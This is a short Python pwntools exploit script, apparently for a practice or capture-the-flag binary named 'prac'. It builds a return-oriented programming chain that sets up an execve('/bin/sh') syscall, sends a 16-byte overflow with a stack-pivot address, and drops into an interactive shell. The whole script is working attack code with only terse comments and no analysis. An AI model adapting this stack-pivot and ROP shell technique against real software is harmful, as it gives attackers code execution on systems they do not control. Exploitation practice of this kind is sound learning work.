#!/usr/bin/env python3


from pwn import *

p = process("./prac")


# big payload
payload = b"" # b"AAAABBBBCCCCDDDD"


payload += p64(0x0040115a) # rax = 0x3b

payload += p64(0x00401162) # pop rdi
payload += p64(0x402004) #/bin/sh

payload += p64(0x00401164) # pop rsi, rdx
payload += p64(0x00)
payload += p64(0x00)

payload += p64(0x00401167)


# pivot
# padding: 8 byte buf + 8 byte rbp
pivot = b"A" * 16 + p64(0x00401250)

pause()

p.sendlineafter(b"name...", payload)

p.sendlineafter(b"age", pivot)



p.interactive()